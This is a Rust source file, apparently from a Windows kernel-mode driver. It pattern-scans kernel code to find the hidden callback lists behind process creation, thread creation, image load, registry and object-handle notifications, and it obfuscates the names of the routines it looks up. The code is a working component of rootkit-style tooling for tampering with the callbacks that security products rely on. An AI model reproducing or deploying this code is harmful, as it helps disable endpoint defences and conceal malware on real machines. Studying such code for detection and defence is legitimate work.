use obfstr::obfstr;
use shared::vars::Callbacks;
use crate::{includes::structs::FULL_OBJECT_TYPE, utils::{self, patterns::scan_for_pattern}};
use wdk_sys::{ntddk::MmGetSystemRoutineAddress, PsProcessType, PsThreadType};

/// Finds the address of the `PsSetCreateProcessNotifyRoutine` routine.
/// 
/// # Returns
/// - `Option<*mut u8>`: Some pointer to the address if found, None otherwise.
/// 
unsafe fn find_ps_create_process() -> Option<*mut u8> {
    let mut name = utils::uni::str_to_unicode(obfstr!("PsSetCreateProcessNotifyRoutine")).to_unicode();
    let function_address = MmGetSystemRoutineAddress(&mut name);

    // e8b6010000  call  nt!PspSetCreateProcessNotifyRoutine (fffff802`517a64a8)
    let instructions = [0xE8];
    let psp_set_create_process = scan_for_pattern(function_address, &instructions, 1, 5, 0x14, i32::from_le_bytes)?; 

    let instructions = [0x4C, 0x8D, 0x2D];
    scan_for_pattern(psp_set_create_process as _, &instructions, 3, 7, 0x98, i32::from_le_bytes)
}

/// Finds the address of the `PsRemoveCreateThreadNotifyRoutine` routine.
/// 
/// # Returns
/// - `Option<*mut u8>`: Some pointer to the address if found, None otherwise.
/// 
unsafe fn find_ps_create_thread() -> Option<*mut u8> {
    let mut name = utils::uni::str_to_unicode(obfstr!("PsRemoveCreateThreadNotifyRoutine")).to_unicode();
    let function_address = MmGetSystemRoutineAddress(&mut name);
    
    // 488d0d57d73d00  lea  rcx,[nt!PspCreateThreadNotifyRoutine (fffff805`7b4ee160)]
    let instructions = [0x48, 0x8D, 0x0D];
    scan_for_pattern(function_address, &instructions, 3, 7, 0x50, i32::from_le_bytes)
}

/// Finds the address of the `PsSetLoadImageNotifyRoutineEx` routine.
/// 
/// # Returns
/// - `Option<*mut u8>`: Some pointer to the address if found, None otherwise.
/// 
unsafe fn find_ps_load_image() -> Option<*mut u8> {
    let mut name = utils::uni::str_to_unicode(obfstr!("PsSetLoadImageNotifyRoutineEx")).to_unicode();
    let function_address = MmGetSystemRoutineAddress(&mut name);  
    
    // 488d0d67d83d00  lea  rcx,[nt!PspLoadImageNotifyRoutine (fffff806`0f0fe360)]
    let instructions = [0x48, 0x8D, 0x0D];
    scan_for_pattern(function_address, &instructions, 3, 7, 0x50, i32::from_le_bytes)
}

/// Finds the address of the `CmRegisterCallbackEx` routine.
/// 
/// # Returns
/// - `Option<*mut u8>`: Some pointer to the address if found, None otherwise.
/// 
unsafe fn find_cm_register_callback() -> Option<(*mut u8, *mut u8, *mut u8)>{
    let mut name = utils::uni::str_to_unicode(obfstr!("CmRegisterCallbackEx")).to_unicode();
    let function_address = MmGetSystemRoutineAddress(&mut name);

    // e8c961e7ff call nt!CmpRegisterCallbackInternal (fffff800`286e2b08)
    let register_internal_pattern = [0xE8];
    let register_callback_internal = scan_for_pattern(function_address, &register_internal_pattern, 1, 5, 0x50, i32::from_le_bytes)?;
    
    // 488bcb     mov rcx,rbx
    // e83d000000 call nt!CmpInsertCallbackInListByAltitude (fffff800`286e2c0c)
    let insert_pattern: [u8; 3] = [0x8B, 0xCB, 0xE8];
    let insert_call_address = scan_for_pattern(register_callback_internal as _, &insert_pattern, 3, 7, 0x108, i32::from_le_bytes)?;

    // 488d0d7b585600  lea rcx,[nt!CmpCallbackListLock (fffff803`216484c0)]
    let cmp_callback_list_lock_pattern = [0x48, 0x8D, 0x0D];
    let callback_list_lock = scan_for_pattern(insert_call_address as _, &cmp_callback_list_lock_pattern, 3, 7, 0x200, i32::from_le_bytes)?;

    // 4c8d3d78585600  lea r15,[nt!CallbackListHead (fffff803`216484d0)]
    let callback_list_head_pattern = [0x4C, 0x8D, 0x3D];
    let callback_list_header = scan_for_pattern(insert_call_address as _, &callback_list_head_pattern, 3, 7, 0x200, i32::from_le_bytes)?;

    // f0ff05fddd5600  lock inc dword ptr [nt!CmpCallBackCount (fffff803`21650abc)]
    let cmp_callback_count_pattern = [0xF0, 0xFF, 0x05];
    let callback_count = scan_for_pattern(insert_call_address as _, &cmp_callback_count_pattern, 3, 7, 0x200, i32::from_le_bytes)?;

    Some((callback_list_header, callback_count, callback_list_lock))
}

/// Finds the address of the `ObRegisterCallbacks` routine.
/// 
/// # Returns
/// - `Option<*mut FULL_OBJECT_TYPE>`: Some pointer to the address if found, None otherwise.
/// 
pub fn find_ob_register_callback(callback: &Callbacks) -> Option<*mut FULL_OBJECT_TYPE> {
    match callback {
        Callbacks::ObProcess => {
            let object_type = unsafe { (*PsProcessType) as *mut FULL_OBJECT_TYPE };
            Some(object_type)
        },
        Callbacks::ObThread => {
            let object_type = unsafe { (*PsThreadType) as *mut FULL_OBJECT_TYPE };
            Some(object_type)
        },
        _ => None
    }
}

/// Finds the type of the callback and calls the function responsible for it.
/// 
/// # Parameters
/// - `callback`: target callback that will be called.
/// 
/// # Returns
/// - `Option<*mut u8>`: Some pointer to the address if found, None otherwise.
///
pub unsafe fn find_callback_address(callback: &Callbacks) -> Option<CallbackResult> {
    match callback {
        Callbacks::PsSetCreateProcessNotifyRoutine => find_ps_create_process().map(CallbackResult::PsCreate),
        Callbacks::PsSetCreateThreadNotifyRoutine => find_ps_create_thread().map(CallbackResult::PsCreate),
        Callbacks::PsSetLoadImageNotifyRoutine => find_ps_load_image().map(CallbackResult::PsCreate),
        Callbacks::CmRegisterCallbackEx => find_cm_register_callback().map(CallbackResult::Registry),
        Callbacks::ObProcess => find_ob_register_callback(callback).map(CallbackResult::ObRegister),
        Callbacks::ObThread => find_ob_register_callback(callback).map(CallbackResult::ObRegister),
    }
}

/// Enum containing return types for each callback.
pub enum CallbackResult {
    PsCreate(*mut u8),
    Registry((*mut u8, *mut u8, *mut u8)),
    ObRegister(*mut FULL_OBJECT_TYPE)
}